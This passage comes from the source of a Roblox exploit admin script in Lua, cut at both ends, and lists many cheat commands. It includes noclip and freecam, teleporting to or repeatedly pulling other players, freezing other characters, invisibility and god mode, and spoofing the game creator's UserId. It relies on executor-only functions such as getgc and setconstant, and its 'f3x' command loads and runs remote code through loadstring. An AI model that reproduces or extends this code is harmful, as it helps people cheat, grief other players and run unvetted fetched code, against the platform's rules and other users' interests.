		for i,v in pairs(players) do
			StartFreecam(getRoot(Players[v].Character).CFrame)
		end
	end)

	addcmd('unfreecam',{'nofreecam','unfc','nofc'},function(args, speaker)
		StopFreecam()
	end)

	addcmd('freecamspeed',{'fcspeed'},function(args, speaker)
		local FCspeed = args[1] or 1
		if isNumber(FCspeed) then
			NAV_KEYBOARD_SPEED = Vector3.new(FCspeed, FCspeed, FCspeed)
		end
	end)

	addcmd('gotocamera',{'gotocam','tocam'},function(args, speaker)
		getRoot(speaker.Character).CFrame = workspace.Camera.CFrame
	end)

	addcmd('tweengotocamera',{'tweengotocam','tgotocam','ttocam'},function(args, speaker)
		game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = workspace.Camera.CFrame}):Play()
	end)

	addcmd('fov',{},function(args, speaker)
		local fov = args[1] or 70
		if isNumber(fov) then
			workspace.CurrentCamera.FieldOfView = fov
		end
	end)

	local preMaxZoom = Players.LocalPlayer.CameraMaxZoomDistance
	local preMinZoom = Players.LocalPlayer.CameraMinZoomDistance
	addcmd('lookat',{},function(args, speaker)
		if speaker.CameraMaxZoomDistance ~= 0.5 then
			preMaxZoom = speaker.CameraMaxZoomDistance
			preMinZoom = speaker.CameraMinZoomDistance
		end
		speaker.CameraMaxZoomDistance = 0.5
		speaker.CameraMinZoomDistance = 0.5
		wait()
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			local target = Players[v].Character
			if target and target:FindFirstChild('Head') then
				workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.p, target.Head.CFrame.p)
				wait(0.1)
			end
		end
		speaker.CameraMaxZoomDistance = preMaxZoom
		speaker.CameraMinZoomDistance = preMinZoom
	end)

	addcmd('fixcam',{'restorecam'},function(args, speaker)
		StopFreecam()
		execCmd('unview')
		workspace.CurrentCamera:remove()
		wait(.1)
		repeat wait() until speaker.Character ~= nil
		workspace.CurrentCamera.CameraSubject = speaker.Character:FindFirstChildWhichIsA('Humanoid')
		workspace.CurrentCamera.CameraType = "Custom"
		speaker.CameraMinZoomDistance = 0.5
		speaker.CameraMaxZoomDistance = 400
		speaker.CameraMode = "Classic"
		speaker.Character.Head.Anchored = false
	end)

	addcmd('enableshiftlock',{'enablesl','shiftlock'},function(args, speaker)
		speaker.DevEnableMouseLock = true
		notify('Shiftlock','Shift lock is now available')
	end)

	addcmd('firstp',{},function(args, speaker)
		speaker.CameraMode = "LockFirstPerson"
	end)

	addcmd('thirdp',{},function(args, speaker)
		speaker.CameraMode = "Classic"
	end)

	addcmd('noclipcam', {'nccam'}, function(args, speaker)
		local sc = (debug and debug.setconstant) or setconstant
		local gc = (debug and debug.getconstants) or getconstants
		if not sc or not getgc or not gc then
			return notify('Incompatible Exploit', 'Your exploit does not support this command (missing setconstant or getconstants or getgc)')
		end
		local pop = speaker.PlayerScripts.PlayerModule.CameraModule.ZoomController.Popper
		for _, v in pairs(getgc()) do
			if type(v) == 'function' and getfenv(v).script == pop then
				for i, v1 in pairs(gc(v)) do
					if tonumber(v1) == .25 then
						sc(v, i, 0)
					elseif tonumber(v1) == 0 then
						sc(v, i, .25)
					end
				end
			end
		end
	end)


	addcmd('maxzoom',{},function(args, speaker)
		speaker.CameraMaxZoomDistance = args[1]
	end)

	addcmd('minzoom',{},function(args, speaker)
		speaker.CameraMinZoomDistance = args[1]
	end)

	addcmd('unlockws',{'unlockworkspace'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Locked = false
			end
		end
	end)

	addcmd('lockws',{'lockworkspace'},function(args, speaker) 
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Locked = true
			end
		end
	end)

	addcmd('delete',{'remove'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() then
				v:Destroy()
			end
		end
		notify('Item(s) Deleted','Deleted ' ..getstring(1))
	end)

	addcmd('deleteclass',{'removeclass','deleteclassname','removeclassname','dc'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.ClassName:lower() == getstring(1):lower() then
				v:Destroy()
			end
		end
		notify('Item(s) Deleted','Deleted items with ClassName ' ..getstring(1))
	end)

	addcmd('chardelete',{'charremove','cd'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() then
				v:Destroy()
			end
		end
		notify('Item(s) Deleted','Deleted ' ..getstring(1))
	end)

	addcmd('chardeleteclass',{'charremoveclass','chardeleteclassname','charremoveclassname','cdc'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v.ClassName:lower() == getstring(1):lower() then
				v:Destroy()
			end
		end
		notify('Item(s) Deleted','Deleted items with ClassName ' ..getstring(1))
	end)

	addcmd('deletevelocity',{'dv','removevelocity','removeforces'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA("BodyVelocity") or v:IsA("BodyGyro") or v:IsA("RocketPropulsion") or v:IsA("BodyThrust") or v:IsA("BodyAngularVelocity") or v:IsA("AngularVelocity") or v:IsA("BodyForce") or v:IsA("VectorForce") or v:IsA("LineForce") then
				v:Destroy()
			end
		end
	end)

	addcmd('deleteinvisparts',{'deleteinvisibleparts','dip'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") and v.Transparency == 1 and v.CanCollide then
				v:Destroy()
			end
		end
	end)

	local shownParts = {}
	addcmd('invisibleparts',{'invisparts'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") and v.Transparency == 1 then
				if not table.find(shownParts,v) then
					table.insert(shownParts,v)
				end
				v.Transparency = 0
			end
		end
	end)

	addcmd('uninvisibleparts',{'uninvisparts'},function(args, speaker)
		for i,v in pairs(shownParts) do
			v.Transparency = 1
		end
		shownParts = {}
	end)

	addcmd('btools',{},function(args, speaker)
		Instance.new("HopperBin", speaker:FindFirstChildOfClass("Backpack")).BinType = 1
		Instance.new("HopperBin", speaker:FindFirstChildOfClass("Backpack")).BinType = 2
		Instance.new("HopperBin", speaker:FindFirstChildOfClass("Backpack")).BinType = 3
		Instance.new("HopperBin", speaker:FindFirstChildOfClass("Backpack")).BinType = 4
	end)

	addcmd('f3x',{'fex'},function(args, speaker)
		loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
	end)

	addcmd('partpath',{'partname'},function(args, speaker)
		selectPart()
	end)

	addcmd('antiafk',{'antiidle'},function(args, speaker)
		local GC = getconnections or get_signal_cons
		if GC then
			for i,v in pairs(GC(Players.LocalPlayer.Idled)) do
				if v["Disable"] then
					v["Disable"](v)
				elseif v["Disconnect"] then
					v["Disconnect"](v)
				end
			end
			notify('Anti Idle','Anti idle is enabled')
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing getconnections)')
		end
	end)

	addcmd('datalimit',{},function(args, speaker)
		if tonumber(args[1]) then
			game:GetService("NetworkClient"):SetOutgoingKBPSLimit(args[1])
		end
	end)

	addcmd('replicationlag',{'backtrack'},function(args, speaker)
		if tonumber(args[1]) then
			settings():GetService("NetworkSettings").IncomingReplicationLag = args[1]
		end
	end)

	addcmd('noprompts', {'nopurchaseprompts'}, function(args, speaker)
		COREGUI.PurchasePromptApp.Enabled = false
	end)

	addcmd('showprompts', {'showpurchaseprompts'}, function(args, speaker)
		COREGUI.PurchasePromptApp.Enabled = true
	end)

	addcmd('age',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		local ages = {}
		for i,v in pairs(players) do
			local p = Players[v]
			table.insert(ages, p.Name.."'s age is: "..p.AccountAge)
		end
		notify('Account Age',table.concat(ages, ',\n'))
	end)

	addcmd('chatage',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		local ages = {}
		for i,v in pairs(players) do
			local p = Players[v]
			table.insert(ages, p.Name.."'s age is: "..p.AccountAge)
		end
		local chatString = table.concat(ages, ', ')
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(chatString, "All")
	end)

	addcmd('joindate',{'jd'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		local dates = {}
		notify("Loading",'Hold on a sec')
		for i,v in pairs(players) do
			local user = game:HttpGet("https://users.roblox.com/v1/users/"..Players[v].UserId)
			local json = game:GetService("HttpService"):JSONDecode(user)
			local date = json["created"]:sub(1,10)
			local splitDates = string.split(date,"-")
			table.insert(dates,Players[v].Name.." joined: "..splitDates[2].."/"..splitDates[3].."/"..splitDates[1])
		end
		notify('Join Date (Month/Day/Year)',table.concat(dates, ',\n'))
	end)

	addcmd('chatjoindate',{'cjd'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		local dates = {}
		notify("Loading",'Hold on a sec')
		for i,v in pairs(players) do
			local user = game:HttpGet("https://users.roblox.com/v1/users/"..Players[v].UserId)
			local json = game:GetService("HttpService"):JSONDecode(user)
			local date = json["created"]:sub(1,10)
			local splitDates = string.split(date,"-")
			table.insert(dates,Players[v].Name.." joined: "..splitDates[2].."/"..splitDates[3].."/"..splitDates[1])
		end
		local chatString = table.concat(dates, ', ')
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(chatString, "All")
	end)

	addcmd('copyname',{'copyuser'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			local name = tostring(Players[v].Name)
			toClipboard(name)
		end
	end)

	addcmd('userid',{'id'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			local id = tostring(Players[v].UserId)
			notify('User ID',id)
		end
	end)

	addcmd('copyid',{'copyuserid'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			local id = tostring(Players[v].UserId)
			toClipboard(id)
		end
	end)

	addcmd('creatorid',{'creator'},function(args, speaker)
		if game.CreatorType == Enum.CreatorType.User then
			notify('Creator ID',game.CreatorId)
		elseif game.CreatorType == Enum.CreatorType.Group then
			local OwnerID = game:GetService('GroupService'):GetGroupInfoAsync(game.CreatorId).Owner.Id
			speaker.UserId = OwnerID
			notify('Creator ID',OwnerID)
		end
	end)

	addcmd('copycreatorid',{'copycreator'},function(args, speaker)
		if game.CreatorType == Enum.CreatorType.User then
			toClipboard(game.CreatorId)
			notify('Copied ID','Copied creator ID to clipboard')
		elseif game.CreatorType == Enum.CreatorType.Group then
			local OwnerID = game:GetService('GroupService'):GetGroupInfoAsync(game.CreatorId).Owner.Id
			toClipboard(OwnerID)
			notify('Copied ID','Copied creator ID to clipboard')
		end
	end)

	addcmd('setcreatorid',{'setcreator'},function(args, speaker)
		if game.CreatorType == Enum.CreatorType.User then
			speaker.UserId = game.CreatorId
			notify('Set ID','Set UserId to '..game.CreatorId)
		elseif game.CreatorType == Enum.CreatorType.Group then
			local OwnerID = game:GetService('GroupService'):GetGroupInfoAsync(game.CreatorId).Owner.Id
			speaker.UserId = OwnerID
			notify('Set ID','Set UserId to '..OwnerID)
		end
	end)

	addcmd('appearanceid',{'aid'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			local aid = tostring(Players[v].CharacterAppearanceId)
			notify('Appearance ID',aid)
		end
	end)

	addcmd('copyappearanceid',{'caid'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			local aid = tostring(Players[v].CharacterAppearanceId)
			toClipboard(aid)
		end
	end)

	addcmd('goto',{'to'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			if Players[v].Character ~= nil then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				getRoot(speaker.Character).CFrame = getRoot(Players[v].Character).CFrame + Vector3.new(3,1,0)
			end
		end
		execCmd('breakvelocity')
	end)

	addcmd('tweengoto',{'tgoto','tto','tweento'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			if Players[v].Character ~= nil then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = getRoot(Players[v].Character).CFrame + Vector3.new(3,1,0)}):Play()
			end
		end
		execCmd('breakvelocity')
	end)

	addcmd('vehiclegoto',{'vgoto','vtp','vehicletp'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			if Players[v].Character ~= nil then
				local seat = speaker.Character.Humanoid.SeatPart
				local vehicleModel = seat.Parent
				repeat
					if vehicleModel.ClassName ~= "Model" then
						vehicleModel = vehicleModel.Parent
					end
				until vehicleModel.ClassName == "Model"
				wait(0.1)
				vehicleModel:MoveTo(getRoot(Players[v].Character).Position)
			end
		end
	end)

	local vnoclipParts = {}
	addcmd('vehiclenoclip',{'vnoclip'},function(args, speaker)
		vnoclipParts = {}
		local seat = speaker.Character.Humanoid.SeatPart
		local vehicleModel = seat.Parent
		repeat
			if vehicleModel.ClassName ~= "Model" then
				vehicleModel = vehicleModel.Parent
			end
		until vehicleModel.ClassName == "Model"
		wait(0.1)
		execCmd('noclip')
		for i,v in pairs(vehicleModel:GetDescendants()) do
			if v:IsA("BasePart") and v.CanCollide then
				table.insert(vnoclipParts,v)
				v.CanCollide = false
			end
		end
	end)

	addcmd('vehicleclip',{'vclip','unvnoclip','unvehiclenoclip'},function(args, speaker)
		execCmd('clip')
		for i,v in pairs(vnoclipParts) do
			v.CanCollide = true
		end
		vnoclipParts = {}
	end)

	addcmd('togglevnoclip',{},function(args, speaker)
		if Clip then
			execCmd('vnoclip')
		else
			execCmd('vclip')
		end
	end)

	addcmd('clientbring',{'cbring'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			if Players[v].Character ~= nil then
				if Players[v].Character:FindFirstChild("Humanoid") then
					Players[v].Character:FindFirstChildOfClass('Humanoid').Sit = false
				end
				wait()
				getRoot(Players[v].Character).CFrame = getRoot(speaker.Character).CFrame + Vector3.new(3,1,0)
			end
		end
	end)

	local bringT = {}
	addcmd('loopbring',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				if Players[v].Name ~= speaker.Name and not FindInTable(bringT, Players[v].Name) then
					table.insert(bringT, Players[v].Name)
					local plrName = Players[v].Name
					local pchar=Players[v].Character
					local distance = 3
					if args[2] and isNumber(args[2]) then
						distance = args[2]
					end
					local lDelay = 0
					if args[3] and isNumber(args[3]) then
						lDelay = args[3]
					end
					repeat
						for i,c in pairs(players) do
							if Players:FindFirstChild(v) then
								pchar = Players[v].Character
								if pchar~= nil and Players[v].Character ~= nil and getRoot(pchar) and speaker.Character ~= nil and getRoot(speaker.Character) then
									getRoot(pchar).CFrame = getRoot(speaker.Character).CFrame + Vector3.new(distance,1,0)
								end
								wait(lDelay)
							else 
								for a,b in pairs(bringT) do if b == plrName then table.remove(bringT, a) end end
							end
						end
					until not FindInTable(bringT, plrName)
				end
			end)
		end
	end)

	addcmd('unloopbring',{'noloopbring'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				for a,b in pairs(bringT) do if b == Players[v].Name then table.remove(bringT, a) end end
			end)
		end
	end)

	local walkto
	addcmd('walkto',{'follow'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			if Players[v].Character ~= nil then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				walkto = true
				repeat wait()
					speaker.Character.Humanoid:MoveTo(getRoot(Players[v].Character).Position)
				until Players[v].Character == nil or not getRoot(Players[v].Character) or walkto == false
			end
		end
	end)

	addcmd('pathfindwalkto',{'pathfindfollow'},function(args, speaker)
		walkto = false
		wait()
		local players = getPlayer(args[1], speaker)
		local PathService = game:GetService("PathfindingService")
		local hum = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		local path = PathService:CreatePath()
		for i,v in pairs(players)do
			if Players[v].Character ~= nil then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				walkto = true
				repeat wait()
					local success, response = pcall(function()
						path:ComputeAsync(getRoot(speaker.Character).Position, getRoot(Players[v].Character).Position)
						local waypoints = path:GetWaypoints()
						local distance 
						for waypointIndex, waypoint in pairs(waypoints) do
							local waypointPosition = waypoint.Position
							hum:MoveTo(waypointPosition)
							repeat 
								distance = (waypointPosition - hum.Parent.PrimaryPart.Position).magnitude
								wait()
							until
							distance <= 5
						end	 
					end)
					if not success then
						speaker.Character.Humanoid:MoveTo(getRoot(Players[v].Character).Position)
					end
				until Players[v].Character == nil or not getRoot(Players[v].Character) or walkto == false
			end
		end
	end)

	addcmd('unwalkto',{'nowalkto','unfollow','nofollow'},function(args, speaker)
		walkto = false
	end)

	addcmd('freeze',{'fr'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		if players ~= nil then
			for i,v in pairs(players) do
				spawn(function()
					for i, x in next, Players[v].Character:GetDescendants() do
						if x:IsA("BasePart") and not x.Anchored then
							x.Anchored = true
						end
					end
				end)
			end
		end
	end)

	addcmd('thaw',{'unfreeze','unfr'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		if players ~= nil then
			for i,v in pairs(players) do
				spawn(function()
					for i, x in next, Players[v].Character:GetDescendants() do
						if x:IsA("BasePart") and x.Anchored then
							x.Anchored = false
						end
					end
				end)
			end
		end
	end)

	oofing = false
	addcmd('loopoof',{},function(args, speaker)
		oofing = true
		repeat wait(0.1)
			for i,v in pairs(Players:GetPlayers()) do
				if v.Character ~= nil and v.Character:FindFirstChild'Head' then
					for _,x in pairs(v.Character.Head:GetChildren()) do
						if x:IsA'Sound' then x.Playing = true end
					end
				end
			end
		until oofing == false
	end)

	addcmd('unloopoof',{},function(args, speaker)
		oofing = false
	end)

	local notifiedRespectFiltering = false
	addcmd('muteboombox',{},function(args, speaker)
		if not notifiedRespectFiltering and game:GetService("SoundService").RespectFilteringEnabled then notifiedRespectFiltering = true notify('RespectFilteringEnabled','RespectFilteringEnabled is set to true (the command will still work but may only be clientsided)') end
		local players = getPlayer(args[1], speaker)
		if players ~= nil then
			for i,v in pairs(players) do
				spawn(function()
					for i, x in next, Players[v].Character:GetDescendants() do
						if x:IsA("Sound") and x.Playing == true then
							x.Playing = false
						end
					end
					for i, x in next, Players[v]:FindFirstChildOfClass("Backpack"):GetDescendants() do
						if x:IsA("Sound") and x.Playing == true then
							x.Playing = false
						end
					end
				end)
			end
		end
	end)

	addcmd('unmuteboombox',{},function(args, speaker)
		if not notifiedRespectFiltering and game:GetService("SoundService").RespectFilteringEnabled then notifiedRespectFiltering = true notify('RespectFilteringEnabled','RespectFilteringEnabled is set to true (the command will still work but may only be clientsided)') end
		local players = getPlayer(args[1], speaker)
		if players ~= nil then
			for i,v in pairs(players) do
				spawn(function()
					for i, x in next, Players[v].Character:GetDescendants() do
						if x:IsA("Sound") and x.Playing == false then
							x.Playing = true
						end
					end
				end)
			end
		end
	end)

	addcmd('reset',{},function(args, speaker)
		speaker.Character:BreakJoints()
	end)

	addcmd('respawn',{},function(args, speaker)
		respawn(speaker)
	end)

	addcmd('refresh',{'re'},function(args, speaker)
		refresh(speaker)
	end)

	addcmd('god',{},function(args, speaker)
		local Cam = workspace.CurrentCamera
		local Pos, Char = Cam.CFrame, speaker.Character
		local Human = Char and Char.FindFirstChildWhichIsA(Char, "Humanoid")
		local nHuman = Human.Clone(Human)
		nHuman.Parent, speaker.Character = Char, nil
		nHuman.SetStateEnabled(nHuman, 15, false)
		nHuman.SetStateEnabled(nHuman, 1, false)
		nHuman.SetStateEnabled(nHuman, 0, false)
		nHuman.BreakJointsOnDeath, Human = true, Human.Destroy(Human)
		speaker.Character, Cam.CameraSubject, Cam.CFrame = Char, nHuman, wait() and Pos
		nHuman.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
		local Script = Char.FindFirstChild(Char, "Animate")
		if Script then
			Script.Disabled = true
			wait()
			Script.Disabled = false
		end
		nHuman.Health = nHuman.MaxHealth
	end)

	invisRunning = false
	addcmd('invisible',{'invis'},function(args, speaker)
		if invisRunning then return end
		invisRunning = true
		-- Full credit to AmokahFox @V3rmillion
		local Player = speaker
		repeat wait(.1) until Player.Character
		local Character = Player.Character
		Character.Archivable = true
		local IsInvis = false
		local IsRunning = true
		local InvisibleCharacter = Character:Clone()
		InvisibleCharacter.Parent = game:GetService'Lighting'
		local Void = workspace.FallenPartsDestroyHeight
		InvisibleCharacter.Name = ""
		local CF

		local invisFix = game:GetService("RunService").Stepped:Connect(function()
			pcall(function()
				local IsInteger
				if tostring(Void):find'-' then
					IsInteger = true
				else
					IsInteger = false
				end
				local Pos = Player.Character.HumanoidRootPart.Position
				local Pos_String = tostring(Pos)
				local Pos_Seperate = Pos_String:split(', ')
				local X = tonumber(Pos_Seperate[1])
				local Y = tonumber(Pos_Seperate[2])
				local Z = tonumber(Pos_Seperate[3])
				if IsInteger == true then
					if Y <= Void then
						Respawn()
					end
				elseif IsInteger == false then
					if Y >= Void then
						Respawn()
					end
				end
			end)
		end)

		for i,v in pairs(InvisibleCharacter:GetDescendants())do
			if v:IsA("BasePart") then
				if v.Name == "HumanoidRootPart" then
					v.Transparency = 1
				else
					v.Transparency = .5
				end
			end
		end

		function Respawn()
			IsRunning = false
			if IsInvis == true then
				pcall(function()
					Player.Character = Character
					wait()
					Character.Parent = workspace
					Character:FindFirstChildWhichIsA'Humanoid':Destroy()
					IsInvis = false
					InvisibleCharacter.Parent = nil
					invisRunning = false
				end)
			elseif IsInvis == false then
				pcall(function()
					Player.Character = Character
					wait()
					Character.Parent = workspace
					Character:FindFirstChildWhichIsA'Humanoid':Destroy()
					TurnVisible()
				end)
			end
		end

		local invisDied
		invisDied = InvisibleCharacter:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
			Respawn()
			invisDied:Disconnect()
		end)

		if IsInvis == true then return end
		IsInvis = true
		CF = workspace.CurrentCamera.CFrame
		local CF_1 = Player.Character.HumanoidRootPart.CFrame
		Character:MoveTo(Vector3.new(0,math.pi*1000000,0))
		workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
		wait(.2)
		workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
		InvisibleCharacter = InvisibleCharacter
		Character.Parent = game:GetService'Lighting'
		InvisibleCharacter.Parent = workspace
		InvisibleCharacter.HumanoidRootPart.CFrame = CF_1
		Player.Character = InvisibleCharacter
		execCmd('fixcam')
		Player.Character.Animate.Disabled = true
		Player.Character.Animate.Disabled = false

		function TurnVisible()
			if IsInvis == false then return end
			invisFix:Disconnect()
			invisDied:Disconnect()
			CF = workspace.CurrentCamera.CFrame
			Character = Character
			local CF_1 = Player.Character.HumanoidRootPart.CFrame
			Character.HumanoidRootPart.CFrame = CF_1
			InvisibleCharacter:Destroy()
			Player.Character = Character
			Character.Parent = workspace
			IsInvis = false
			Player.Character.Animate.Disabled = true
			Player.Character.Animate.Disabled = false
			invisDied = Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
				Respawn()
				invisDied:Disconnect()
			end)
			invisRunning = false
		end
		notify('Invisible','You now appear invisible to other players')
	end)

	addcmd('visible',{'vis'},function(args, speaker)
		TurnVisible()
	end)

	addcmd('toggleinvis',{},function(args, speaker)
		if invisRunning then
			execCmd('visible')
		else
			execCmd('invisible')
		end
	end)

	addcmd('toolinvisible',{'toolinvis','tinvis'},function(args, speaker)
		local Char  = Players.LocalPlayer.Character
		local touched = false
		local tpdback = false
		local box = Instance.new('Part')
		box.Anchored = true
		box.CanCollide = true
		box.Size = Vector3.new(10,1,10)
		box.Position = Vector3.new(0,10000,0)
		box.Parent = workspace
		local boxTouched = box.Touched:connect(function(part)
			if (part.Parent.Name == Players.LocalPlayer.Name) then
				if touched == false then
					touched = true
					local function apply()
						local no = Char.HumanoidRootPart:Clone()
						wait(.25)
						Char.HumanoidRootPart:Destroy()
						no.Parent = Char
						Char:MoveTo(loc)
						touched = false
					end
					if Char then
						apply()
					end
				end
			end
		end)
		repeat wait() until Char
		local cleanUp
		cleanUp = Players.LocalPlayer.CharacterAdded:connect(function(char)
			boxTouched:Disconnect()
			box:Destroy()
			cleanUp:Disconnect()
		end)
		loc = Char.HumanoidRootPart.Position
		Char:MoveTo(box.Position + Vector3.new(0,.5,0))
	end)

	addcmd('strengthen',{},function(args, speaker)
		for _, child in pairs(speaker.Character:GetDescendants()) do
			if child.ClassName == "Part" then
				if args[1] then
					child.CustomPhysicalProperties = PhysicalProperties.new(args[1], 0.3, 0.5)
				else
					child.CustomPhysicalProperties = PhysicalProperties.new(100, 0.3, 0.5)
				end
			end
		end
	end)

	addcmd('weaken',{},function(args, speaker)
		for _, child in pairs(speaker.Character:GetDescendants()) do
			if child.ClassName == "Part" then
				if args[1] then
					child.CustomPhysicalProperties = PhysicalProperties.new(-args[1], 0.3, 0.5)
				else
					child.CustomPhysicalProperties = PhysicalProperties.new(0, 0.3, 0.5)
				end
			end
		end
	end)

	addcmd('unweaken',{'unstrengthen'},function(args, speaker)
		for _, child in pairs(speaker.Character:GetDescendants()) do
			if child.ClassName == "Part" then
				child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
			end
		end
	end)

	addcmd('breakvelocity', {}, function(args, speaker)
		local BeenASecond, V3 = false, Vector3.new(0, 0, 0)
		delay(1, function()
			BeenASecond = true
		end)
		while not BeenASecond do
			for _, v in ipairs(speaker.Character:GetDescendants()) do
				if v.IsA(v, "BasePart") then
					v.Velocity, v.RotVelocity = V3, V3
				end
			end
			wait()
		end
	end)

	addcmd('jpower',{'jumppower','jp'},function(args, speaker)
		local jpower = args[1] or 50
		if isNumber(jpower) then
			speaker.Character:FindFirstChildOfClass('Humanoid').JumpPower = jpower
		end
	end)

	addcmd('maxslopeangle',{'msa'},function(args, speaker)
		local sangle = args[1] or 89
		if isNumber(sangle) then
			speaker.Character:FindFirstChildOfClass('Humanoid').MaxSlopeAngle = sangle
		end
	end)

	addcmd('gravity',{'grav'},function(args, speaker)
		local grav = args[1] or 196.2
		if isNumber(grav) then
			workspace.Gravity = grav
		end
	end)

	addcmd('hipheight',{'hheight'},function(args, speaker)
		local height
		if r15(speaker) then
			height = args[1] or 2.1
		else
			height = args[1] or 0
		end
		speaker.Character:FindFirstChildOfClass('Humanoid').HipHeight = height
	end)

	addcmd('dance', {}, function(args, speaker)
		if not r15(speaker) then
			local dances = {"27789359", "30196114", "248263260", "45834924", "33796059", "28488254", "52155728"}
			local animation = Instance.new("Animation")
			animation.AnimationId = "rbxassetid://" .. dances[math.random(1, #dances)]
			animTrack = speaker.Character.Humanoid:LoadAnimation(animation)
			animTrack:Play()
		else
			notify('R6 Required', 'This command requires the r6 rig type')
		end
	end)

	addcmd('undance',{'nodance'},function(args, speaker)
		animTrack:Stop()
		animTrack:Destroy()
	end)

	addcmd('nolimbs',{'rlimbs'},function(args, speaker)
		if r15(speaker) then
			for i,v in pairs(speaker.Character:GetChildren()) do
				if v:IsA("BasePart") and
					v.Name == "RightUpperLeg" or
					v.Name == "LeftUpperLeg" or
					v.Name == "RightUpperArm" or
					v.Name == "LeftUpperArm" then
					v:Destroy()
				end
			end
		else
			for i,v in pairs(speaker.Character:GetChildren()) do
				if v:IsA("BasePart") and
					v.Name == "Right Leg" or
					v.Name == "Left Leg" or
					v.Name == "Right Arm" or
					v.Name == "Left Arm" then
					v:Destroy()
				end
			end
		end
	end)

	addcmd('nohead',{'rhead','headless'},function(args, speaker)
		if sethidden then
			-- Full credit to Thomas_Cornez#0272 @Discord
			local lplr = Players.LocalPlayer
			local char = lplr.Character
			local rig = tostring(char.Humanoid.RigType) == "Enum.HumanoidRigType.R6" and 1 or tostring(char.Humanoid.RigType) == "Enum.HumanoidRigType.R15" and 2

			local speaker = Players.LocalPlayer

			sethidden(speaker, "SimulationRadius", math.huge)

			local test = Instance.new("Model")
			local hum  = Instance.new("Humanoid")
			local animation = Instance.new("Model")
			local humanoidanimation = Instance.new("Humanoid")
			test.Parent = workspace
			hum.Parent = test
			animation.Parent = workspace
			humanoidanimation.Parent = animation

			lplr.Character = test
			wait(2)
			char.Humanoid.Animator.Parent = humanoidanimation
			char.Humanoid:Destroy()

			char.Head:Destroy()
			wait(5)
			game.Players.LocalPlayer.Character = char

			local hum2 = Instance.new("Humanoid")
			hum2.Parent = char
			char:FindFirstChildOfClass("Humanoid").Jump = true

			humanoidanimation.Animator.Parent = hum2
			char.Animate.Disabled = true
			wait()
			char.Animate.Disabled = false
			wait()

			if rig == 1 then
				hum2.HipHeight = 0
			elseif rig == 2 then
				hum2.HipHeight = 2.19
			end
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
		end
	end)

	addcmd('noarms',{'rarms'},function(args, speaker)
		if r15(speaker) then
			for i,v in pairs(speaker.Character:GetChildren()) do
				if v:IsA("BasePart") and
					v.Name == "RightUpperArm" or
					v.Name == "LeftUpperArm" then
					v:Destroy()
				end
			end
		else
			for i,v in pairs(speaker.Character:GetChildren()) do
				if v:IsA("BasePart") and
